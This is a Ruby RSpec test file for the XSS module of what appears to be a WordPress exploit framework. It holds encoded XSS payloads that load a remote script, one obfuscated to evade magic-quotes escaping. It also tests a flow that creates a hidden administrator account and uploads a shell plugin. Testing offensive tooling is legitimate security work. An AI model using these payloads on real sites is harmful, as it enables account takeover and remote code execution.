# frozen_string_literal: true

require_relative '../../../spec_helper'
require 'erb'

describe Wpxf::WordPress::Xss do
  let(:klass) do
    Class.new(Wpxf::Module) do
      include Wpxf::WordPress::Xss

      def initialize
        super
      end
    end
  end

  let(:subject) { klass.new }
  let(:base_path) { File.expand_path(File.join(__dir__, '..', '..', '..', '..')) }
  let(:session_cookie) { 'session cookie' }
  let(:upload_res) { true }

  before :each, 'setup subject' do
    allow(subject).to receive(:emit_success)
    allow(subject).to receive(:emit_info)
    allow(subject).to receive(:authenticate_with_wordpress).and_return(session_cookie)
    allow(subject).to receive(:upload_payload_as_plugin_and_execute).and_return(upload_res)

    subject.active_workspace = Wpxf::Models::Workspace.first
    subject.set_option_value('host', '127.0.0.1')
    subject.set_option_value('xss_host', '127.0.0.1')
    subject.set_option_value('xss_path', 'path')
    subject.set_option_value('http_server_bind_port', 1234)
  end

  describe '#new' do
    it 'registers xss_host and xss_path options' do
      subject = klass.new
      expect(subject.get_option('xss_host')).to_not be_nil
      expect(subject.get_option('xss_path')).to_not be_nil
    end

    it 'should register a description' do
      expect(subject.module_desc).to match(/This module stores a script/)
    end
  end

  describe '#xss_host' do
    it 'returns the normalized value of the xss_host option' do
      expect(subject.xss_host).to eq '127.0.0.1'
    end
  end

  describe '#xss_path' do
    it 'returns the normalized value of the xss_path option' do
      expect(subject.xss_path).to eq 'path'
    end
  end

  describe '#xss_url' do
    it 'returns the URL to be requested by the XSS attack' do
      expect(subject.xss_url).to eq 'http://127.0.0.1:1234/path'
    end
  end

  describe '#xss_include_script' do
    it 'returns the encoded JS include script wrapped in an eval call' do
      encoded = 'eval(decodeURIComponent(/var%20a%20%3D%20document.createElem'\
                'ent%28%22script%22%29%3Ba.setAttribute%28%22src%22%2C%20%22h'\
                'ttp%3A%2F%2F127.0.0.1%3A1234%2Fpath%22%29%3Bdocument.head.app'\
                'endChild%28a%29%3B/.source))'
      expect(subject.xss_include_script).to eq encoded
    end
  end

  describe '#xss_ascii_encoded_include_script' do
    it 'returns a JS include script that is ASCII encoded to bypass '\
       'automatic escaping by the likes of magic-quotes' do
      encoded = 'eval(String.fromCharCode(101,118,97,108,40,100,101,99,'\
                '111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,'\
                '40,47,118,97,114,37,50,48,97,37,50,48,37,51,68,37,50,48,'\
                '100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,'\
                '69,108,101,109,101,110,116,37,50,56,37,50,50,115,99,114,'\
                '105,112,116,37,50,50,37,50,57,37,51,66,97,46,115,101,116,'\
                '65,116,116,114,105,98,117,116,101,37,50,56,37,50,50,115,'\
                '114,99,37,50,50,37,50,67,37,50,48,37,50,50,104,116,116,'\
                '112,37,51,65,37,50,70,37,50,70,49,50,55,46,48,46,48,46,49,'\
                '37,51,65,49,50,51,52,37,50,70,112,97,116,104,37,50,50,37,'\
                '50,57,37,51,66,100,111,99,117,109,101,110,116,46,104,101,'\
                '97,100,46,97,112,112,101,110,100,67,104,105,108,100,37,50,'\
                '56,97,37,50,57,37,51,66,47,46,115,111,117,114,99,101,41,41))'
      expect(subject.xss_ascii_encoded_include_script).to eq encoded
    end
  end

  describe '#xss_url_and_ascii_encoded_include_script' do
    it 'returns a URL encoded version of #xss_ascii_encoded_include_script' do
      expect(subject.xss_url_and_ascii_encoded_include_script).to eq ERB::Util.url_encode(subject.xss_ascii_encoded_include_script)
    end
  end

  describe '#wordpress_js_create_user' do
    it 'should include the js/ajax_download.js file' do
      ajax_download_path = File.join(base_path, 'data', 'js', 'ajax_download.js')
      expected = File.read(ajax_download_path)
      expect(subject.wordpress_js_create_user).to include(expected)
    end

    it 'should include the js/ajax_post.js file' do
      ajax_post_path = File.join(base_path, 'data', 'js', 'ajax_post.js')
      expected = File.read(ajax_post_path)
      expect(subject.wordpress_js_create_user).to include(expected)
    end

    it 'should include the js/create_wp_user.js file' do
      data_file_double = double('data file')
      allow(data_file_double).to receive(:content_with_named_vars)
        .and_return('rspec mock data')

      allow(Wpxf::DataFile).to receive(:new)
        .with('js', 'create_wp_user.js')
        .and_return(data_file_double)

      expect(subject.wordpress_js_create_user).to include('rspec mock data')
    end

    it 'should replace $wordpress_url_new_user with the appropriate URL' do
      res = subject.wordpress_js_create_user
      expect(res).to match(/postInfo\(".+?user-new.php/)
    end

    it 'should replace $username with a random 6 byte alpha value' do
      res = subject.wordpress_js_create_user
      expect(res).to match(/data\.append\('user_login', '[a-zA-Z]{6}'\)/)
    end

    it 'should replace $password with a random 10 byte alphanumeric value followed by an exclamation mark' do
      res = subject.wordpress_js_create_user
      expect(res).to match(/data\.append\('pass1', '[a-zA-Z0-9]{10}!'\)/)
    end

    it 'should replace $email with a random e-mail address' do
      res = subject.wordpress_js_create_user
      expect(res).to match(/data\.append\('email', '[a-zA-Z]{7}@[a-zA-Z]{10}\.com'\)/)
    end

    it 'should replace $xss_url with the XSS URL' do
      res = subject.wordpress_js_create_user
      expect(res).to match(%r{a\.setAttribute\("src", "http://127\.0\.0\.1:1234/path})
    end
  end

  describe '#on_http_request' do
    before :each, 'setup mocks' do
      allow(subject).to receive(:stop_http_server)
      allow(subject).to receive(:upload_shell)
      allow(subject).to receive(:wordpress_js_create_user).and_return('script double')
    end

    context 'if the `u` and `p` params are present' do
      it 'should store the credentials in the database' do
        cred = Wpxf::Models::Credential.first(username: 'xss', password: 'pass')
        expect(cred).to be_nil

        subject.on_http_request('/', { 'u' => 'xss', 'p' => 'pass' }, {})
        cred = Wpxf::Models::Credential.first(username: 'xss', password: 'pass')
        expect(cred).to_not be_nil
      end

      it 'should emit the credentials' do
        subject.on_http_request('/', { 'u' => 'user', 'p' => 'pass' }, {})
        expect(subject).to have_received(:emit_success)
          .with('Created a new administrator user, user:pass')
          .exactly(1).times
      end

      it 'should stop the HTTP server' do
        subject.on_http_request('/', { 'u' => 'user', 'p' => 'pass' }, {})
        expect(subject).to have_received(:stop_http_server).exactly(1).times
      end

      it 'should initiate the shell upload process' do
        subject.on_http_request('/', { 'u' => 'user', 'p' => 'pass' }, {})
        expect(subject).to have_received(:upload_shell)
          .with('user', 'pass')
          .exactly(1).times
      end

      it 'should set #xss_shell_success to the result of the upload' do
        allow(subject).to receive(:upload_shell).and_return(true)
        subject.on_http_request('/', { 'u' => 'user', 'p' => 'pass' }, {})
        expect(subject.xss_shell_success).to be true

        allow(subject).to receive(:upload_shell).and_return(false)
        subject.on_http_request('/', { 'u' => 'user', 'p' => 'pass' }, {})
        expect(subject.xss_shell_success).to be false
      end
    end

    context 'if no credentials were sent' do
      it 'should emit a notice that it is serving the JavaScript' do
        subject.on_http_request('/', {}, {})
        expect(subject).to have_received(:emit_info)
          .with('Incoming request received, serving JavaScript...')
          .exactly(1).times
      end

      it 'should return the create user script' do
        res = subject.on_http_request('/', {}, {})
        expect(res).to eql 'script double'
      end
    end
  end

  describe '#upload_shell' do
    context 'if authentication fails' do
      let(:session_cookie) { nil }

      it 'should return false' do
        res = subject.upload_shell('user', 'pass')
        expect(res).to be false
      end
    end

    context 'if authentication succeeds' do
      it 'should upload the payload as a plugin using randomly generated names' do
        allow(Wpxf::Utility::Text).to receive(:rand_alpha).and_return('rand1', 'rand2')
        subject.upload_shell('user', 'pass')
        expect(subject).to have_received(:upload_payload_as_plugin_and_execute)
          .with('rand1', 'rand2', 'session cookie')
          .exactly(1).times
      end
    end

    context 'if the payload execution succeeds' do
      let(:upload_res) { true }

      it 'should return true' do
        res = subject.upload_shell('user', 'pass')
        expect(res).to be true
      end
    end

    context 'if the payload execution fails' do
      let(:upload_res) { nil }

      it 'should return false' do
        res = subject.upload_shell('user', 'pass')
        expect(res).to be false
      end
    end
  end

  describe '#xss_shell_success' do
    it 'should initially return false' do
      expect(subject.xss_shell_success).to be false
    end
  end
end
